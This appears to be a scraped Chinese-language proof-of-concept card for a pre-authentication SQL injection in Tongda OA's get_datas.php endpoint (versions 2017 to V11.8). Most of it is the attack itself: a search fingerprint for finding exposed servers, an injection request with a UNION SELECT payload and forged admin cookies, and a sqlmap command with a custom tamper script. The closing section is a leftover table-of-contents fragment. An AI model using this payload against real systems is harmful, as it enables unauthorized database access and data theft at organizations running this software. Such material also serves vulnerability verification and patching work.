# 通达OAget_datas存在前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1&tab=5 where 1={`='` 2} union select user()-- ' HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: PHPSESSID=a817a534f7c99980f8be6ad061b4c2cb; USER_NAME_COOKIE=admin; OA_USER_ID=a…`

**请求体 / payload**
```

sqlmap
GET /general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1&tab=5 where {`'` 1}%20 HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=a817a534f7c99980f8be6ad061b4c2cb; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c589adfc; UI_COOKIE=0; KEY_RANDOMDATA=13568
tamper脚本\
\[TD\_get\_datas.py]\(公众号：渗透安全HackTwo
sqlmap -r 1.txt --batch --tamper=TD_get_datas

```

**其他**
- 通达OA get\_datas 存在前台SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA 2017-通达OA V11.8